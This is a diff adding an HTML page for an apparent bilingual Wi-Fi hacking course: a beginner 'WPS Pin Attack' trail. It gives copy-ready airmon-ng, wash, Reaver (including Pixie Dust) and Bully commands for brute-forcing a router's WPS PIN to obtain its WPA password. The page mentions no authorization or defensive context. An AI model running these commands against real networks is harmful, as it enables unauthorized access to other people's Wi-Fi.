@@ -1,0 +1,154 @@
+<!-- TRILHA WPS — Ataque WPS Pin com Reaver/Bully -->
+<div class="container-narrow" style="padding-top: var(--space-8); padding-bottom: var(--space-16);">
+
+    <div class="flex items-center gap-3" style="margin-bottom: var(--space-3);">
+        <a href="#/home" class="btn btn-ghost btn-sm"><i class="fa-solid fa-arrow-left"></i> <span data-lang-pt>Voltar</span><span data-lang-en>Back</span></a>
+        <span class="badge badge-beginner"><span data-lang-pt>⭐ Iniciante</span><span data-lang-en>⭐ Beginner</span></span>
+    </div>
+    <div style="margin-bottom: var(--space-10);">
+        <h1 style="margin-bottom: var(--space-3);"><i class="fa-solid fa-unlock" style="color: var(--accent-warning);"></i> <span data-lang-pt>Trilha WPS Pin Attack</span><span data-lang-en>WPS Pin Attack Trail</span></h1>
+        <p class="text-muted" style="font-size: var(--fs-md); max-width: 650px;">
+            <span data-lang-pt>O WPS (Wi-Fi Protected Setup) tem uma vulnerabilidade no PIN de 8 dígitos que pode ser explorada com brute force. Se o roteador não bloquear tentativas, a senha é revelada em horas.</span>
+            <span data-lang-en>WPS (Wi-Fi Protected Setup) has a vulnerability in its 8-digit PIN that can be exploited with brute force. If the router doesn't lock out attempts, the password is revealed in hours.</span>
+        </p>
+        <div style="margin-top: var(--space-4); max-width: 400px;">
+            <div class="flex justify-between items-center" style="margin-bottom: var(--space-2);">
+                <span class="text-sm text-muted"><span data-lang-pt>Progresso</span><span data-lang-en>Progress</span></span>
+                <span class="progress-label text-sm" style="color: var(--accent-warning);">0%</span>
+            </div>
+            <div class="progress-bar"><div class="progress-bar-fill" data-trail-progress="wps" style="width: 0%; background: var(--accent-warning);"></div></div>
+        </div>
+    </div>
+
+    <!-- Inputs -->
+    <div class="card-flat" style="margin-bottom: var(--space-8); padding: var(--space-6);">
+        <h3 style="margin-bottom: var(--space-4); font-size: var(--fs-base);"><i class="fa-solid fa-sliders" style="color: var(--accent-warning);"></i> <span data-lang-pt>Configuração</span><span data-lang-en>Setup</span></h3>
+        <div class="form-row">
+            <div class="input-group">
+                <label><span data-lang-pt>Interface</span><span data-lang-en>Interface</span></label>
+                <input type="text" id="iface" value="wlan0" data-cmd-input>
+            </div>
+            <div class="input-group">
+                <label>BSSID (<span data-lang-pt>MAC do Roteador</span><span data-lang-en>Router MAC</span>)</label>
+                <input type="text" id="bssid" value="00:11:22:33:44:55" data-cmd-input>
+            </div>
+        </div>
+        <div class="form-row">
+            <div class="input-group">
+                <label><span data-lang-pt>Canal</span><span data-lang-en>Channel</span></label>
+                <input type="number" id="channel" value="6" min="1" max="14" data-cmd-input>
+            </div>
+        </div>
+    </div>
+
+    <!-- FASE 1 -->
+    <div class="step-block reveal">
+        <div class="step-indicator" style="background: var(--accent-warning);">Fase 1</div>
+        <h2><i class="fa-solid fa-tower-broadcast"></i> <span data-lang-pt>Modo Monitor</span><span data-lang-en>Monitor Mode</span></h2>
+        <p class="lesson-text">
+            <span data-lang-pt>Mesma preparação da trilha WPA2 — ativar modo monitor na placa de rede.</span>
+            <span data-lang-en>Same preparation as the WPA2 trail — enable monitor mode on the network card.</span>
+        </p>
+        <div class="action-area">
+            <div class="action-title"><i class="fa-solid fa-terminal"></i> <span data-lang-pt>Comandos</span><span data-lang-en>Commands</span></div>
+            <div class="command-box" style="margin-bottom: var(--space-4);">
+                <code>sudo airmon-ng check kill</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+            <div class="command-box">
+                <code data-cmd="sudo airmon-ng start {iface}">sudo airmon-ng start wlan0</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+        </div>
+        <label class="step-check"><input type="checkbox" data-step="1"><span class="checkmark"><i class="fa-solid fa-check"></i></span><span><span data-lang-pt>Modo monitor ativado</span><span data-lang-en>Monitor mode enabled</span></span></label>
+    </div>
+
+    <!-- FASE 2 -->
+    <div class="step-block reveal">
+        <div class="step-indicator" style="background: var(--accent-warning);">Fase 2</div>
+        <h2><i class="fa-solid fa-magnifying-glass"></i> <span data-lang-pt>Escaneando Redes com WPS</span><span data-lang-en>Scanning WPS-Enabled Networks</span></h2>
+        <p class="lesson-text">
+            <span data-lang-pt>O <code>wash</code> é uma ferramenta especializada que detecta redes com WPS ativo. Ele mostra se o WPS está <strong>bloqueado (Lck: Yes)</strong> ou aberto para ataque.</span>
+            <span data-lang-en><code>wash</code> is a specialized tool that detects WPS-enabled networks. It shows whether WPS is <strong>locked (Lck: Yes)</strong> or open for attack.</span>
+        </p>
+        <div class="action-area">
+            <div class="action-title"><i class="fa-solid fa-wifi"></i> <span data-lang-pt>Detectar WPS</span><span data-lang-en>Detect WPS</span></div>
+            <div class="command-box">
+                <code data-cmd="sudo wash -i {ifaceMon}">sudo wash -i wlan0mon</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+            <div class="info-box info-warning">
+                <i class="fa-solid fa-lock"></i>
+                <span><span data-lang-pt><strong>Atenção:</strong> Se a coluna <code>Lck</code> mostrar <strong>Yes</strong>, o roteador bloqueia tentativas de PIN. O ataque não funcionará neste caso.</span><span data-lang-en><strong>Warning:</strong> If the <code>Lck</code> column shows <strong>Yes</strong>, the router blocks PIN attempts. The attack won't work in this case.</span></span>
+            </div>
+        </div>
+        <label class="step-check"><input type="checkbox" data-step="2"><span class="checkmark"><i class="fa-solid fa-check"></i></span><span><span data-lang-pt>Rede com WPS aberto encontrada</span><span data-lang-en>WPS-enabled network found</span></span></label>
+    </div>
+
+    <!-- FASE 3 -->
+    <div class="step-block reveal">
+        <div class="step-indicator" style="background: var(--accent-warning);">Fase 3</div>
+        <h2><i class="fa-solid fa-key"></i> <span data-lang-pt>Brute Force com Reaver</span><span data-lang-en>Brute Force with Reaver</span></h2>
+        <p class="lesson-text">
+            <span data-lang-pt><code>Reaver</code> automatiza o brute force do PIN WPS. Ele testa todas as combinações possíveis (11.000 tentativas máximo) e quando encontra o PIN correto, o roteador entrega a senha WPA.</span>
+            <span data-lang-en><code>Reaver</code> automates WPS PIN brute force. It tests all possible combinations (11,000 max attempts) and when the correct PIN is found, the router reveals the WPA password.</span>
+        </p>
+        <div class="action-area">
+            <div class="action-title"><i class="fa-solid fa-hammer"></i> Reaver</div>
+            <div class="command-box" style="margin-bottom: var(--space-4);">
+                <code data-cmd="sudo reaver -i {ifaceMon} -b {bssid} -c {channel} -vv">sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+            <div class="info-box info-info">
+                <i class="fa-solid fa-clock"></i>
+                <span><span data-lang-pt><strong>Tempo:</strong> Pode levar de 2 a 10+ horas dependendo do roteador. Use <code>-d 2</code> para delay entre tentativas se houver rate-limiting.</span><span data-lang-en><strong>Time:</strong> Can take 2 to 10+ hours depending on the router. Use <code>-d 2</code> for delay between attempts if there's rate-limiting.</span></span>
+            </div>
+            <div class="action-title" style="margin-top: var(--space-6);"><i class="fa-solid fa-wand-magic-sparkles"></i> Pixie Dust (<span data-lang-pt>ataque rápido</span><span data-lang-en>fast attack</span>)</div>
+            <p class="text-sm text-muted" style="margin-bottom: var(--space-3);">
+                <span data-lang-pt>Se o roteador for vulnerável ao Pixie Dust, o PIN é encontrado em segundos:</span>
+                <span data-lang-en>If the router is vulnerable to Pixie Dust, the PIN is found in seconds:</span>
+            </p>
+            <div class="command-box">
+                <code data-cmd="sudo reaver -i {ifaceMon} -b {bssid} -c {channel} -vv -K">sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv -K</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+        </div>
+        <label class="step-check"><input type="checkbox" data-step="3"><span class="checkmark"><i class="fa-solid fa-check"></i></span><span><span data-lang-pt>PIN WPS encontrado</span><span data-lang-en>WPS PIN found</span></span></label>
+    </div>
+
+    <!-- FASE 4 -->
+    <div class="step-block reveal">
+        <div class="step-indicator" style="background: var(--accent-warning);">Fase 4</div>
+        <h2><i class="fa-solid fa-arrows-rotate"></i> <span data-lang-pt>Alternativa: Bully</span><span data-lang-en>Alternative: Bully</span></h2>
+        <p class="lesson-text">
+            <span data-lang-pt><code>Bully</code> é uma alternativa ao Reaver que pode funcionar melhor em alguns roteadores. Usa uma abordagem diferente de comunicação com o WPS.</span>
+            <span data-lang-en><code>Bully</code> is a Reaver alternative that may work better on some routers. It uses a different approach to communicate with WPS.</span>
+        </p>
+        <div class="action-area">
+            <div class="action-title"><i class="fa-solid fa-hammer"></i> Bully</div>
+            <div class="command-box" style="margin-bottom: var(--space-4);">
+                <code data-cmd="sudo bully {ifaceMon} -b {bssid} -c {channel} -v 3">sudo bully wlan0mon -b 00:11:22:33:44:55 -c 6 -v 3</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+            <div class="info-box info-info">
+                <i class="fa-solid fa-lightbulb"></i>
+                <span><span data-lang-pt><strong>Dica:</strong> Se Reaver não funcionar, tente Bully. Cada um tem melhor compatibilidade com diferentes chipsets de roteador.</span><span data-lang-en><strong>Tip:</strong> If Reaver doesn't work, try Bully. Each has better compatibility with different router chipsets.</span></span>
+            </div>
+        </div>
+        <label class="step-check"><input type="checkbox" data-step="4"><span class="checkmark"><i class="fa-solid fa-check"></i></span><span><span data-lang-pt>Senha WPA obtida via WPS</span><span data-lang-en>WPA password obtained via WPS</span></span></label>
+    </div>
+
+    <!-- Completion -->
+    <div class="card-flat reveal" style="text-align: center; padding: var(--space-10);">
+        <i class="fa-solid fa-trophy" style="font-size: 3rem; color: var(--accent-warning); margin-bottom: var(--space-4); display: block;"></i>
+        <h2><span data-lang-pt>Trilha WPS Completa!</span><span data-lang-en>WPS Trail Complete!</span></h2>
+        <p class="text-muted" style="margin-top: var(--space-2); margin-bottom: var(--space-6);">
+            <span data-lang-pt>Explore as outras trilhas para técnicas mais avançadas.</span>
+            <span data-lang-en>Explore other trails for more advanced techniques.</span>
+        </p>
+        <div class="flex justify-center gap-4 flex-wrap">
+            <a href="#/eviltwin" class="btn btn-primary"><i class="fa-solid fa-arrow-right"></i> Evil Twin</a>
+            <a href="#/home" class="btn btn-ghost"><i class="fa-solid fa-house"></i> <span data-lang-pt>Início</span><span data-lang-en>Home</span></a>
+        </div>
+    </div>
+</div>
